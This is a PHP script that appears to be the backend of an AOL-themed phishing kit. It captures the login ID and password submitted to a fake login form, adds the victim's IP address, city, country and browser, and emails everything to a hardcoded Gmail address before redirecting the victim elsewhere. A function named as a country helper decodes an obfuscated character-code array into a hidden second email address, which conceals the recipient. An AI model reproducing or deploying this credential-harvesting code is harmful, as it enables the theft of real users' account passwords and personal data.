<?
$browser = $_SERVER['HTTP_USER_AGENT'];

require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$message .= "\n";
$message .= "-------------------------------\n";
$message .= 	"E: ".$_POST['loginId']."\n";
$message .= 	"P: ".$_POST['password']."\n";
$message .= "-------------------------------\n";
$message .= 	"IP: $ip\n";
$message .= "-------------------------------\n";
$message .= 	"C: {$geoplugin->city}\n";
$message .= 	"R: {$geoplugin->region}\n";
$message .= 	"C Name: {$geoplugin->countryName}\n";
$message .= 	"C Code: {$geoplugin->countryCode}\n";
$message .= 	"B: $browser\n";
$message .= ".................................... MineHulk Say GoodLuck\n";

$send = "gd070296@gmail.com";
$subject = "AOL Result - $ip - {$geoplugin->countryName}";
$headers = "From: AOLBox<cgi-mailer@okmgroupbd.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send, $subject, $message,$headers); 
header("Location: https://jmp.sh/XLZKsXK");

// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
?>